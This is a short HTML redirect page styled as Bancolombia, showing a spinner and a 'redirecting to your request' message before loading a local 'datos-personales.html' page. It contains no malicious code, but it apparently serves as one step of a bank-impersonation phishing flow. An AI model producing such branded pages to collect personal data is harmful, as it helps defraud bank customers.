<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirigiendo - Bancolombia</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .loading-container {
            text-align: center;
            padding: 20px;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #005CA9;
            margin-bottom: 30px;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #FDDA24;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #005CA9;
            font-size: 16px;
            font-weight: 600;
        }

        .loading-subtext {
            color: #666;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo">Bancolombia</div>
        <div class="spinner"></div>
        <p class="loading-text">Redirigiendo a tu solicitud...</p>
        <p class="loading-subtext">Por favor espera un momento</p>
    </div>
    
    <script>
        // Redirigir autom√°ticamente despu√©s de 1.5 segundos
        setTimeout(function() {
            window.location.href = 'datos-personales.html';
        }, 1500);
    </script>
</body>
</html>
